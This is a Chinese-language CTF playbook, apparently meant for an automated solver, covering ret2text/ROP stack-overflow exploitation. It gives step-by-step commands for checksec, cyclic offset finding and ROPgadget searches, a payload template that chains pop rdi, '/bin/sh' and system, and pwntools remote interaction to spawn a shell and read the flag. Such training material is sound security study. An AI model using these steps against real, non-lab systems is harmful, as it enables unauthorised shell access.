---
name: pwn/ret2text-rop
description: 无 PIE/无 canary 的栈溢出，直接跳回程序自带的后门或 system("/bin/sh")
when_to_use: checksec 显示 NX 开启但无 PIE/无 canary，程序里有 win/backdoor 函数或调用 system 的路径
categories: [pwn]
keywords: [ret2text, ret2win, overflow, rop, checksec, cyclic, pop rdi, system]
stages: [环境与保护, 定位偏移, 找目标与 gadget, 构造 payload, 交互取 flag]
source: challenges/ret2text_x64 (41s, $0.0101)
---

## 1. 环境与保护

- 动作：`checksec --file=./chal`（或 `pwn checksec`）；`file ./chal`；`readelf -h | grep Type`。
- 判据：能明确写出四项——架构、PIE 开关、NX、canary；并据此选定攻击类型（ret2text / ret2libc / ret2syscall）。
- 失败分支：开了 PIE → 先找泄漏点（格式化字符串、`write(1, buf, n)`），转 ret2libc；开了 canary → 找 `__stack_chk_fail` 覆盖或先泄漏 canary。

## 2. 定位偏移

- 动作：本地用 `cyclic(200)` 打崩（`gdb -q ./chal -ex "run <<< $(python3 -c 'print(cyclic(200))')"`），看 `RIP`/`$rsp` overwritten 值，`cyclic_find(<值>)` 得偏移。
- 判据：偏移是个确定整数，且 `cyclic(offset) + p64(0xdeadbeef)` 能稳定跳到 `0xdeadbeef`。
- 失败分支：偏移对不上 → 检查是否有 `sub rsp, N` 的栈对齐、或输入被 `strcpy` 前处理过；改用 `pwndbg` 的 `cyclic` 再看。

## 3. 找目标与 gadget

- 动作：`objdump -d ./chal | grep -n "win\|system"` 找后门；没有后门就找 `pop rdi; ret`（`ROPgadget --binary ./chal --only "pop|ret"`）+ `/bin/sh` 字符串（`ROPgadget --string "/bin/sh"` 或 `strings -t x`）。
- 判据：拿到「一个可跳的地址」+（若需要）「一个 pop rdi 地址」+「/bin/sh 地址」，且三者都不受 PIE 影响。
- 失败分支：没有 `pop rdi` → 用 `ret2csu` 或 `pop rsi; pop r15; ret` 组合；没有 `/bin/sh` → `gets` 写到 `.bss` 再引用。

## 4. 构造 payload

- 动作：`payload = b"A"*offset + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)`；64 位注意 **栈 16 字节对齐**，必要时在 pop_rdi 前垫一个 `ret`。
- 判据：本地 `pwn.process` 跑一遍，能拿到 shell 或触发后门（`cat flag`）。
- 失败分支：`system` 段错误（SIGSEGV 且 rsp 不 16 对齐）→ 加/去掉一个 `ret`；后门函数里有 `system("/bin/sh")` 但没输出 → 用 `sendline` 交互而不是 `send`。

## 5. 交互取 flag

- 动作：远程 `remote(host, port)`，发 payload，`sendline("cat /flag*")`，`recvall`。
- 判据：能读到形如 `flag{...}`/`DASCTF{...}` 的串。
- 失败分支：连上没回显 → 先 `recvuntil(b"> ")` 对齐提示符；仍无 → 检查是不是要走 `sh -c` 或需要先过 `setvbuf` 的缓冲。
